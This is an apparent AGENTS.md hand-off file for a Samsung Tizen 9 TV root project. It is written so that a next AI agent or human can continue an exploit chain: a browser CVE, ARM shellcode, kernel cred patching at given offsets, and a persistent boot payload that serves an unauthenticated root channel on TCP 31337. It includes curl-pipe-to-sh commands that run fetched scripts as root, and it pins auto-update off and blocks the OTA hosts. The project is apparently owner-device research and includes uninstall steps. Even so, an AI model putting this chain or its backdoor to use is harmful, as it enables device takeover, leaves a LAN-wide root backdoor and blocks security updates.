# AGENTS.md — hand-off for the next agent or human

You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
then `docs/EXPLOIT.md` (how it works), `docs/USAGE.md` (running it),
`docs/ROOT-METHODS.md` (what was found), `docs/FAILED.md` (do not repeat these),
`docs/SERVER-HOSTING.md` (the PC-side server) and `docs/REMOTE.md`
(remote/hotkey remapping). History lives in `CHANGELOG.md`,
and the current work list — triaged from an independent code review — is
`docs/OPEN-ISSUES.md`: read it before changing anything, it says what is known
broken, in what order to fix it, and how to prove each fix.

## 0. Maintaining this repo — read before editing

**Any change you make must be recorded in [`CHANGELOG.md`](CHANGELOG.md).** Add an
entry under `Unreleased` (or a dated batch if you are landing several related
changes together), listing what changed and **why**. If you change a script's
behaviour, a payload offset, a documented procedure or a trap, the changelog entry
is part of the change — not an optional extra.

Division of labour:

| File | What it holds |
|---|---|
| `CHANGELOG.md` | dated history: what changed and why |
| `docs/` | the *how*: exploit chain, usage, root methods, dead ends, portability |
| this file | the *state now*: current status, procedures, verification, traps |

Do not put dated narrative here; put it in the changelog and link to it.

## 1. Current state

**Rooted and persistent.** The TV roots itself during boot through the replaced IL of
the stock on-boot app `com.samsung.tv.MultiControl-Service`, then serves a command
channel on TCP 31337 (line protocol, replies end with `__END__`).

| | |
|---|---|
| Payload | v16, 24,064 B, md5 `ef8721881df2903f36371aaa482eed9f` (`server/payload.dll`, source `payload/`; host-independent) |
| Boot-to-root | ~40 s typical; v16 cold boot rooted at 21:48:45 with `bind=192.168.178.175` (channel up at the first probe, +7 s); v14 measured 53 s from a forced reboot |
| Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
| Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
| Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |

**Serve port 80 with `pysrv.exe`, never `python.exe` on this PC.** The Windows
firewall has inbound *Block* rules for `python.exe` and *Allow* rules for
`pysrv.exe`, so a `python server.py` server is invisible to the TV (no page, no
beacons) while it answers perfectly from the PC's own loopback. `root.ps1`'s
`Find-Python` already prefers `pysrv.exe`; starting `server.py` by hand does not.

A root channel that refuses connections cannot tell "app never started" from
"app started and failed" — `logs/beacons.log` can, and it works before rooting.
No beacon at all means AUL is not launching the app (boot row gone / DLL broken);
beacons without 31337 means the payload is failing later and the chain names the
step. The remote's power button is standby, not a boot: only a real cold boot
runs the hook. To force one, ask for a mains unplug (trap 12: `systemctl --force
reboot` from the payload once left the set in a standby the remote could not
wake).

The boot sequence is deliberate: the first launch after a cold boot usually cannot read
task memory coherently, so the payload makes one short attempt, exits on purpose, and
lets AUL relaunch it (~1–4 s). A fresh process re-maps the device and succeeds. Four
fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a
long in-process fallback takes over.

Verified independently: two cold boots after a power-cycle (43 s and 47 s from
power-on, no PC involvement) and one full run from a stock TV through the one-click
flow. The sequence of changes that got here is in `CHANGELOG.md`.

**Fallback if the payload is ever missing:** `python tools/tv_rootwatch.py` with the TV
browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
`server/recover.sh` from that shell to reinstall the payload.

Payload lineage (v5 → v16, and what each version fixed) is in `CHANGELOG.md`; the label
regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.

### Channel hardening (v14, extended in v15/v16)

The app must still be able to prove root "with no PC", so nothing on the boot path
may block on the network:

- **31337 binds one address (v16).** The listener binds the TV's OWN address,
  derived at runtime from the route to the recorded PC (a UDP `connect` that sends
  nothing) — never a hardcoded IP, so another person's laptop needs no change.
  That keeps it off Wi-Fi Direct/tethering, which a wildcard listener was reachable
  from. It is re-derived every 30 s and the listener rebound if the address moves
  (`Pending()` polling makes that possible); with no route yet (TV offline) it
  falls back to `Any` and beacons `chan bind … failed`, because a working channel
  beats a closed port. `PeerAllowed` still filters the peer.
- **Cred writes are ours-only (v15).** `PatchCred` refuses any cred whose uid is
  not 5001, so a bogus `real_parent`/`parent` that happens to point at init's
  cred (uid 0) is never written; a uid-0 cred counts as "already done". This is
  the full M4 close — `SaneCred` remains the pointer-shape check. The Python
  lane mirrors it in `kernel_root.patch_ours()` (used by `root_via_fork` and the
  legacy `root()`); `tv_rootwatch.root_by_tail` was already gated.

- **Beacons have a 500 ms connect timeout.** A stale `rootchan.host` (PC off, or
  the address moved to another subnet) used to cost TCP SYN retries inside the
  ~40 s budget. The local `share/root_boot.txt` marker is the durable record.
- **`/dev/video40` is closed in every fork child** before it sleeps, and closed
  before the fast-exit `Environment.Exit`. Without that, each landmark child kept
  the single RDWR opener for 120 s and the next AUL launch sat in the `open()`
  retry — a slow-boot cause that looked like a failed round.
- **31337 bounds every client.** 30 s read/write timeout, 4 KB per command line,
  8 KB pending without a newline, then the client is dropped. One silent
  connection used to own the single-threaded accept loop until the app restarted.
- **The allowlist fails closed.** `share/rootchan.allow` must exist and list the
  peer; `deploy.sh` writes it *before* the DLL. A hand-copied payload therefore
  needs that file too — create it with the PC's address or the channel stays shut.
### Auto-update is pinned off

The TV would happily replace the app the payload lives in. The payload therefore
re-asserts the menu setting at every boot (v13, unchanged in v16) and logs the readback
(`DSHROOT autoupdate … = Int32: 0`):

```sh
buxton2ctl set-int32 system db/menu/support/softwareupdate/autoupdate 0
buxton2ctl set-int32 user   db/menu/support/softwareupdate/autoupdate 0
buxton2ctl get      system db/menu/support/softwareupdate/autoupdate
```

The key was found in `SWUAutoUpgrade`'s string table; `0` is off. The units behind
it are `swu-auto-upgrade.path` (fires on
`/run/user/5001/.swu-auto-upgrade-launch`) and
`org.tizen.tv.swu.otascheduler`. For a network-level backstop, block the OTA hosts
at the router — `otn2.samsungcloudcdn.com`,
`otnprd8..11.samsungcloudsolution.net`, `samsungotn.net`.

### The command channel survives a runaway command

`Run()` redirects a command's output to a temp file rather than a pipe, and on the
15 s timeout kills the whole process tree. A pipe was closed only when every
descendant closed it, so one long-lived grandchild (a `grep -r /opt`) used to wedge
the channel until the TV was power-cycled. A timed-out command now returns
`[timeout: killed after 15s]` and the channel keeps serving.

## 2. Target facts

| Item | Value |
|---|---|
| Model / platform | QNX1D series, 2024 Neo QLED (QTV T09 platform) |
| OS | Tizen 9 |
| Kernel | Linux 5.4.249, ARM32 LPAE, `PHYS_OFFSET 0x20000000` |
| Browser | Chromium 120.0.6099.5 (WasmGC available) |
| Kernel Image | phys `0x20008000`, signature `ee4400eb00900fe1` |
| `init_task` | `0xC0957180` (phys `0x20957180`) |
| Task list offset | `0x23C` (`prev` links; `next` unusable) |
| cred / real_cred / comm | task+`0x3F8` / `0x3F4` / `0x400` |
| Full caps | `0x0000003fffffffff` |
| Root channel | TCP `31337` |

These constants are specific to this firmware build. Before using the toolkit on
another model or firmware, re-measure the Image base, `init_task`, the task-list
offset and the cred offsets, and verify the physmap still works (see
`README.md` → Compatibility).

## 3. Architecture

```
TV browser (uid 5001, gid 44 video)
  └─ index.html ──CVE-2024-2887──▶ renderer R/W + ARM shellcode
        └─ physmap stub: opens /dev/video40, serves RPC over TCP/80
              ▲
PC            │ server/server.py (port 80: page + RPC gateway on 127.0.0.1:9998)
              │ tools/auto_root.py / kernel_root.py / physmap.py / root_shell.py
              ▼
TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
  └─ MultiControlService.dll (payload) ─▶ physmap ─▶ cred patch ─▶ TCP 31337
```

## 4. Required tools

- **PC on the same LAN.** The TV must reach the PC's TCP/80; the PC must reach
  the TV's TCP/31337.
- **Python 3** for the server and clients.
  - On Windows the base `python.exe` path was blocked by a firewall rule; the
    server was run under a renamed copy (`pysrv.exe`). Any interpreter the
    firewall permits works; `root.ps1` auto-detects one.
- **.NET SDK 6+** only to rebuild the boot payload.
- **keystone + capstone** (Python) only to rebuild `tools/physrpc.S` into
  shellcode.
- No sdb, no Tizen Studio, no firmware images, no flashing.

## 5. Files

`root.ps1` is the one-command entry point; it expects this layout:

| File | Purpose |
|---|---|
| `server/server.py` | port-80 HTTP server + RPC gateway + shell bridge |
| `server/index.html` | page that loads the browser chain |
| `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
| `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
| `server/deploy.sh` | deploy script executed on the TV as root (verifies md5) |
| `server/uninstall.sh` | restores the stock app (run via the channel) |
| `server/payload.dll` | the root-on-boot payload served to the TV |
| `tools/physmap.py` | RPC client (hello, read/write, ops) |
| `tools/kernel_root.py` | finds the kernel/`init_task`/task and patches the cred |
| `tools/auto_root.py` | waits for a stub, roots it, runs the deploy script |
| `tools/root_shell.py` | root-channel client (TCP 31337) |
| `tools/run_root.py` | run a shell command as root via op 7 (manual) |
| `tools/write_root.py` | write a file as root via op 8 (manual) |
| `tools/physrpc.S` | ARM32 RPC stub source (clamps every client length) |
| `tools/build_physrpc.py` | assembles the stub (keystone/capstone); `--check-embedded` diffs it against the page |
| `tools/physrpc_shellcode.bin` | the assembled stub (committed; `embed_physrpc.py` needs it) |
| `tools/embed_physrpc.py` | writes the blob into `browser_payload.js`'s `SHELLCODE` (`--check`) |
| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`; not a validated pair) |
| `tools/sim_rpc.py` | in-memory physmap RPC (no TV); `python tools/sim_rpc.py` self-test |
| `tools/test_gateway.py` | gateway integration test (no TV): RSET, pairing, forwarding, BUSY, /save cap |
| `tools/test_shell.py` | deploy/uninstall dry tests under `sh` (no TV): backups, label, boot row |
| `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
| `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
| `tools/tv_ws_launch.py` | Samsung remote-control WebSocket diagnostic/launcher (refused on this unit) |
| `payload/Program.cs` | boot payload source (v16) |
| `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
| `root.ps1` | one-command runner (server + root + deploy + verify) |
| `uninstall.ps1` | one-command uninstall (restore stock + verify) |
| `server/logs/` | **all runtime output** (created on demand, git-ignored) |

### Logs

Everything the toolkit writes at runtime goes under `server/logs/`, so the
toolkit directory itself stays clean:

| Path | What |
|---|---|
| `logs/server.out`, `logs/server.err` | stdout/stderr of the server, redirected there by `root.ps1` / `uninstall.ps1` |
| `logs/shell.log`, `logs/shell.log.1` | rolling capture of the TV shell/console (8 MB rotation) |
| `logs/beacons.log` | one timestamped line per `DSHROOT …` beacon from the payload — **the fastest way to see whether the app started at all** |
| `logs/tv/tv_output_*.txt` | dumps the exploit page POSTs to `/save` (kept to the newest 100; override with `TV_OUTPUT_KEEP`) |

`/logs/**` is refused by the HTTP server (404), so the directory is never served
to the LAN even though it sits inside the docroot. If you run `server.py`
yourself, it creates `logs/` next to itself; only the two redirect files are the
launcher's responsibility.

### Root without the app payload (host watchdog)

If the payload is not installed (or the TV was just uninstalled), root is
available through the browser lane plus a watchdog:

```
# after each boot, with the TV browser on http://<pc>/index.html
python tools/tv_rootwatch.py          # root the stub, then op5 -> shell on :9999
```

`tools/tv_rootwatch.py` starts `server/server.py` with `pysrv.exe` if port 80 is
down, attaches to the RPC gateway, and roots the stub - tail walk for the
`PHYSRPC1` comm first, otherwise a content scan for owner creds
(`ids = 5001,100 x4` at `cred+4`, bounded to phys `0x20000000-0x40000000` because
reads past `0x46000000` hang the stub). With the shell step it then sends op 5, so
**`127.0.0.1:9999` becomes an interactive root shell** (`id -u` -> `0`); it dies
when the page reloads, so re-run the watchdog after a reload.

Note: once the browser process's cred has been patched in a boot, new renderers
inherit it, so later stubs come up already root and the watchdog reports
`root: already`. A reboot clears that - the watchdog then does the real work.

The only manual step is the page load. Set the TV browser's start page to the
URL once and re-running the watchdog is all that is needed after a boot.

### Wedged stubs: `RSET` instead of a server restart

A stub can stop answering without the TCP socket closing - typically after an
`op 5` (EXEC) or `op 7` (RUN) consumed it, or after a TV power cycle that left a
half-open socket. The gateway used to keep such a socket as its current pairing
forever, so every later client got a cached hello and nothing else, and the only
cure was restarting the server.

Now the gateway accepts a 4-byte **`RSET`** sentinel instead of a tunnel client:
it closes the paired TV socket and replies `OK` (or `IDLE` if nothing was
paired). Use it from Python:

```python
import physmap; print(physmap.reset_stub())   # "OK" / "IDLE" / "no-gateway(...)"
```

The next page load then pairs cleanly. The tools call it automatically
automatically when no live stub answers. Treat a stub as single-use for `op 7`
and never send FILE (op 8) bytes to a stub that has already been turned into a
shell - that corrupts the stream and wastes the page load.

### Repository hygiene (`.gitignore`, `.gitattributes`)

**Committed** (~50 files, ~420 KB on a fresh clone): `docs/`, `payload/*.cs` +
`*.csproj`, `server/{server.py,index.html,payload.dll,deploy.sh,uninstall.sh,diag.sh}`,
`server/lib/`, `server/payloads/`, `tools/*.py|*.S|*.txt`, `root.ps1`,
`uninstall.ps1`, `AGENTS.md`, `README.md`, `NOTICE.md`.

**Ignored**: `server/logs/` (runtime), `payload/obj/` + `payload/out/` +
`payload/bin/` (rebuildable: `cd payload && dotnet build -c Release`),
`tools/__pycache__/`, `server/deploy_local.sh` (per-host, contains the PC IP),
`.root_probe`, plus the usual editor/OS/scratch/secret patterns and
`*.tpk`/`*.wgt`.

`server/payload.dll` is committed **deliberately** — it is the artifact the TV
fetches during deploy, and it is byte-identical to the build output
`payload/out/MultiControlService.dll` (md5 `ef872188…`, v16), so the repo runs
without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.

`.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
rewrite them. `*.ps1` is CRLF; DLLs and other binaries are marked `binary`.

Not needed at runtime: `payload/` source, docs, `.NET SDK`.

## 6. Reproduce the root from scratch

**Fast path:** `pwsh -File root.ps1 -TvIp <tv-ip>` does steps 0–4 and 6 below
(use `-DryRun` first). It needs `tools/` + `server/` beside it, or
`-ToolkitDir`; it reuses a server already serving `index.html`, and
`-RestartServer` replaces a different server on port 80. The manual steps that
remain are on the TV remote: load the page, then reboot.

Placeholders: `<HOST_IP>` = PC, `<TV_IP>` = TV.

```sh
# 0. on the PC
cd server
python server.py                        # or: pysrv.exe server.py

# 1. on the TV browser open
#    http://<HOST_IP>/index.html
#    wait for HARNESS_UP / WASM_LOADED / PAYLOAD_LOADED / RUNNING
#    do not open another tab; do not reload after RUNNING

# 2. root the renderer (fresh stub!)
cd ../tools
python kernel_root.py --fork
#    accept ONLY: ids = (5001, 100, 5001, 100, ...) then
#                 uid=0 cap_permitted=0x3fffffffff
#    if ids = (0,0,...) -> the cred was already patched (root) or bogus;
#    if it says "skip ... (not a cred)" -> reload the page and retry

# 3. verify
python run_root.py "id" 6               # uid=0(root)

# 4. deploy the boot payload
python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
#    expect: UID=0, SIZE=24064, MD5=ef872188..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
#    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)

# 5. reboot the TV (exit the browser first so it does not restore the page)

# 6. permanent root
python root_shell.py "id" <TV_IP>        # uid=0(root)
python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'" <TV_IP>
```

`tools/auto_root.py` automates steps 2 and 4: start it, then load the page once.

## 7. Verification checklist

Run `python tools/test_all.py` first — it covers the offline layers (cred layout,
gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:

- [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
- [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `ef872188…`.
- [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
- [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
- [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
      + clamps). Details per layer: `docs/TESTING.md`.

## 8. Traps (each cost hours — read `docs/FAILED.md`)

1. **Stub lifetime is minutes.** The renderer is killed by the browser
   watchdog while blocked in the shellcode. Deploy in one batch.
2. **Reloading the page kills the stub.** Each load = a new stub; root it and
   deploy without reloading.
3. **One `/dev/video40` RDWR opener.** If the boot payload holds it, the
   browser cannot; the payload must close it after rooting.
4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
   the child.
5. **Kernel pointers can be above `0xE0000000`** (LPAE 1 GB direct map). Never
   bound kernel pointers at `0xE0000000`.
6. **Post-fork managed code.** Use a pre-pinned buffer + raw
   `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
7. **Short commands.** The stub's `cmdbuf` is 512 B and `run_root.py` /
   `auto_root.py` now refuse commands over 509 B (`write_root.py`: 255 B path,
   4 KB chunk); use `curl …/deploy.sh | sh`. Commands over ~100 chars were
   observed killing a stub even under the limit.
8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
   `/dev/tztv_tcon` (TCON flash = brick risk).
10. **Keep TV auto-update off.** An OTA replaces the app and the boot row.
11. **The browser payload's callback IP is baked into the shellcode.** If the PC
    IP changes, rebuild `tools/physrpc.S` (`build_physrpc.py`) and re-embed the
    shellcode in `server/payloads/browser_payload.js`; `root.ps1` only rewrites
    the deploy script.
12. **Do not reboot the TV with `systemctl --force reboot` from the payload.** It
    worked once and then left the set in a deep standby that the remote could not
    wake; only unplugging it from the wall brought it back. Ask for a power cycle
    (or press the TV's own button) instead.
13. **`root_via_fork` needs every tag, not the first one — and a uid-0 cred must
    not end the walk.** A freed `PHYSRPC1` task from an earlier page load can sit
    nearer the list tail than the live stub; its cred pointer fails the sane-cred
    check, and if it happens to point at a uid-0 cred, an "already rooted" early
    return hides the live stub. `_find_tags_near_tail()` returns all of them;
    `tv_rootwatch.root_by_tail` only writes uid-5001 creds and reports `already`
    only when none exist. Keep both properties.

## 9. Rebuilding the payload

```sh
cd payload
dotnet build -c Release -o out
# new file: out/MultiControlService.dll
```

Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
that downloads it) and reboot. Things to preserve when editing `Program.cs`:

- `Kptr(v) => v >= 0xC0000000` (accept the full 32-bit direct map).
- Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
- **Close `_fd` in the child with `syscall(6, _fd, …)`** before it sleeps, and
  keep the child free of CLR allocations.
- `Thread.Sleep(700)` in the parent after `fork()`.
- Patch the **parent** task's cred (`real_parent`), not the child's.
- Validate the cred (`SaneCred`: usage, ids, physical range) **and only write it when its uid is 5001** (`PatchCred` enforces this in v15).
- Close `_fd` after rooting, before `RootChannel()`.
- Keep the channel line protocol and the `__END__` terminator.
- **A rebuild is not byte-reproducible across commits.** The SDK embeds the git
  SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the md5 changes even
  with identical source: take `WANT=`/`SIZE_WANT=` from the new artifact and
  deploy it. Comments do not change the IL. Pin
  `IncludeSourceRevisionInInformationalVersion=false` in the csproj if
  reproducible artifacts ever matter (candidate for v17).

## 10. Recovery

- **Payload fails to root at boot, channel down:** the browser path still works.
  Load `index.html` and run `root.ps1` again — or, from a root shell,
  `server/recover.sh`. If `/dev/video40` is held by the failed payload, wait
  (~2 min, it exits) or power-cycle.
- **Restore stock app / uninstall:** `pwsh -File uninstall.ps1 -TvIp <tv-ip>`. It
  uses the 31337 channel to run `server/uninstall.sh`, which md5-checks and
  restores the stock IL + AOT (relabelled), deletes the boot row unless
  `-KeepBoot`, and verifies the table. It then waits through the reboot and
  confirms 31337 stays closed — **the power-cycle is yours to do**, the script
  only waits for it. Manual fallback if the channel is down: load `index.html`,
  `kernel_root.py --fork`, then
  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh" 120` (the default
  wait is 3 s, far too short).
- **Backups on the TV:** `mcs_orig.dll` (original IL),
  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`.
  `payload_backup.dll` is whatever was in `bin/` before the last deploy — it is
  **not** guaranteed to be stock, so uninstall never uses it (it restores from
  `mcs_orig.dll` and checks the md5).
- **Browser stub rebuild:** `tools/physrpc.S` + `tools/build_physrpc.py`, then
  `tools/embed_physrpc.py` (no manual paste; it refuses a staging overflow). Both
  `--check` modes must pass before a page test.

## 11. Open work

- ~~Bind 31337 to a single address~~ — **done in v16**: the listener binds the TV address derived from the route to the recorded PC (re-derived every 30 s, `Any` fallback with a beacon if there is no route), so it is off Wi-Fi Direct/tethering while staying portable. Live: `/proc/net/tcp` shows `AFB2A8C0:7A69` (192.168.178.175:31337), not `00000000:7A69`.
- ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
  READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
  two ops whose payload would desync the stream; blob rebuilt (7552 B), page
  re-embedded by `tools/embed_physrpc.py`, live-verified by `tools/test_stub.py`.
- ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
  (120 s retry), so a browser stub holding the device no longer costs a cycle.
- ~~Replace the task-list walk with a list-independent locator~~ — **done**: `tools/scan_cred.py` finds creds by content
  (`ids = 5001,100 ×4` at `cred+4`, refcount-checked) and patches them; 253
  creds were rooted in one pass with no task list at all. The walk is still used
  when it happens to work (fresh stub), and the pid-hash/IDR routes remain
  blocked for the reasons recorded below.
  pid-hash and IDR locators are both blocked on this kernel (no kallsyms, and
  `init_pid_ns` has no `idr` field) — the cred-content scan above made them
  unnecessary. Full reasoning: `docs/SCRIPT-REVIEW.md`.
- ~~Automate re-embedding the shellcode in `browser_payload.js` after a rebuild~~
  — **done**: `tools/embed_physrpc.py` writes the blob into the page (refusing a
  staging overflow) and `--check` proves page == blob; `build_physrpc.py
  --check-embedded` proves blob == `physrpc.S`.
- Repoint the remote's app buttons by patching `com.samsung.tv.hotkey-service`
  (see `docs/REMOTE.md`): capture the `XF86AppN` key, decompile the service IL,
  change the appid, deploy with a backup, test one button.
- Add a `next.dll` self-update flow test (the code path exists but is unused).
- Re-measure offsets on other Tizen 9 models; the physmap primitive may be
  shared even where the constants differ.
- Measure OTA behaviour (does an update replace the app/boot row?).

## 12. Safety rules

- Only on hardware you own. A bad physical write can brick the TV.
- One change at a time; verify with `root_shell.py` after each.
- Never overwrite unknown system files; keep the backups.
- The root channel is unauthenticated: treat it as a LAN-wide root backdoor.

* **Recovery:** `server/recover.sh` — paste it into a root shell on the TV
  (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
  takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
  `deploy.sh` restarts the app so the new DLL loads. Verified on
  a cold boot (31337 in 41 s, no PC involvement).